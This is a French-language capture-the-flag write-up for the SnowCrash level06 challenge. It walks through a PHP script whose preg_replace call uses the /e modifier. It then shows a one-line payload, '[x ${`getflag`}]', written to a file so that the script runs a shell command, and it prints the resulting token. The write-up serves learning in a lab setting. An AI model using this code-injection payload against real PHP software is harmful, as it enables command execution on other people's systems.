```sh
level05@SnowCrash:/$ su level06
Password:
level06@SnowCrash:~$ ls
level06  level06.php
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

Indenté ce code donne :
```php
#!/usr/bin/php
<?php

function y($m) 
{
  $m = preg_replace("/\./", " x ", $m);
  $m = preg_replace("/@/", " y", $m);
  return $m;
}

function x($y, $z)
{
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}

$r = x($argv[1], $argv[2]); print $r;
?>
```
Avec les commentaires : 
```php
#!/usr/bin/php
<?php

function y($m) 
{
  $m = preg_replace("/\./", " x ", $m); # remplace le caractére "." par " x "
  $m = preg_replace("/@/", " y", $m); # remplace le caractere @ par " y"
  return $m;
}

function x($y, $z)
{
  $a = file_get_contents($y); # recupere le contenu du fichier passé en premier argument (y)
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); # [x (.*)\] -> capture le groupe suivant "x " ;
                                                          # /e -> substitue non pas par une chaine de caractere mais par un retour de fonction ;
                                                          # y(\"\\2\") -> appelle la fonction y avec le deuxieme groupe capturé (le (.*) apres "x " ;
  $a = preg_replace("/\[/", "(", $a); # remplace "[" par "("
  $a = preg_replace("/\]/", ")", $a); # remplace "]" par ")"
  return $a;
}

$r = x($argv[1], $argv[2]); #appele la fonction x avec les 2 premiers arguments et enregistre le retour dans la variable r
print $r; # afficher le retour de la fonction x
?>
```
Nous allons donc envoyer une commande shell en tant que variable a la fonction, et executer le script.
```sh
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/flag
level06@SnowCrash:~$ ./level06 /tmp/flag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```
Nous avons obtenu le flag !
